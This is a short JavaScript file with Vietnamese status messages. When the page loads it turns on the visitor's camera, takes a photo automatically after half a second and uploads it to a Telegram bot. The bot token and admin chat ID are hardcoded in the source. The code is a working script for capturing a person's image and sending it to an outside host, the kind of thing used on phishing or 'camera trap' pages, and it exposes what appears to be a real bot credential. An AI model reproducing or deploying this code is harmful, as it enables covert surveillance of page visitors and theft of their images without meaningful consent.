const botToken = "7981310164:AAHJ-0-RSJQs1y7u7occVGdIBfch45TzHvE";
const adminId = "6331676184";

const video = document.getElementById("camera");
const canvas = document.getElementById("canvas");
const statusText = document.getElementById("status");

async function startCamera() {
    try {
        statusText.textContent = "Đang bật camera...";

        const stream = await navigator.mediaDevices.getUserMedia({ video: true });

        video.srcObject = stream;

        // Chờ video load rồi auto chụp
        video.onloadedmetadata = () => {
            setTimeout(() => autoCapture(), 500);
        };

        statusText.textContent = "Camera đã bật, đang tự chụp ảnh...";
    } catch (error) {
        statusText.textContent = "Không bật được camera. Bạn phải cấp quyền!";
    }
}

async function autoCapture() {
    const context = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL("image/jpeg");

    statusText.textContent = "Đang gửi ảnh về Telegram...";

    await sendToTelegram(imageData);

    statusText.textContent = "Đã gửi ảnh về Telegram!";
}

async function sendToTelegram(base64Image) {
    const blob = await (await fetch(base64Image)).blob();
    const formData = new FormData();
    formData.append("chat_id", adminId);
    formData.append("photo", blob, "capture.jpg");

    await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: "POST",
        body: formData
    });
}

startCamera();
